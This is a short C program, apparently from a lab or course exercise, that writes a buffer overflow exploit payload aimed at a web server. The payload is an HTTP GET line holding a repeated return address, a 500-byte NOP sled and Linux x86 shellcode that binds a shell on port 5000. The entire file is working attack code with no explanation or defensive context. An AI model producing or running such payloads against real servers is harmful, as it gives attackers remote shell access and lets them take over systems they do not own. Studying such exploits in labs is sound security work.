#include <stdlib.h>
#include <stdio.h>

int main(int argc, char** argv) {
    char shellfile[] = "shellfile.dat";
    char shellcode[] = "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68\x13\x88\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80";
    char address[] = "\xa8\xfe\xff\xbf";
    char noop[] = "\x90";

    freopen(shellfile, "w", stdout);

    printf("GET /");

    int index;

    for (index = 0; index < 50; index++) {
        printf("%s", address);
    }

    for (index = 0; index < 500; index++) {
        printf("%s", noop);
    }

    printf("%s ", shellcode);
    printf("HTTP");
    fclose(stdout);

    return 0;
}
